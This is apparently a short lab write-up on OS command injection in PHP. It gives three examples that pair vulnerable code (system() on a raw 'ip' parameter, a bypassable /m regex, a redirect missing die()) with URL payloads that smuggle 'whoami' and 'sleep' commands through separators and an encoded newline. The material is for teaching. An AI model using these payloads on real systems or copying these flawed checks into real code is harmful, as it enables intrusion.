#### Example 1

Payloads:
```
$host/example1.php?ip=127.0.0.2%26%26echo;echo;whoami
$host/example1.php?ip=127.0.0.2;echo;echo;whoami
$host/example1.php?ip=127||whoami
$host/example1.php?ip=127;whoami
$host/example1.php?ip=127.0.0.2;sleep+5
```

Code:
```php
system("ping -c 2 ".$_GET['ip']);
```


#### Example 2

Payload (hex encoded line feed LF `\n` + `/m` regex multi line):
```
$host/example2.php?ip=127.0.0.1%0aecho+1
```


Code:
```php
if (!(preg_match('/^\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}$/m', $_GET['ip']))) { die("Invalid IP address"); }
system("ping -c 2 ".$_GET['ip']);
```


#### Example 3

Payload:
```
$host/example3.php?ip=127%7C%7Cwhoami
```

Code:
```php
if (!(preg_match('/^\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}$/', $_GET['ip']))) {
     header("Location: example3.php?ip=127.0.0.1");
    // redirect to other page
    // die() is missing
}
// but if we don't follow the redirect system function will be called
system("ping -c 2 ".$_GET['ip']);
```
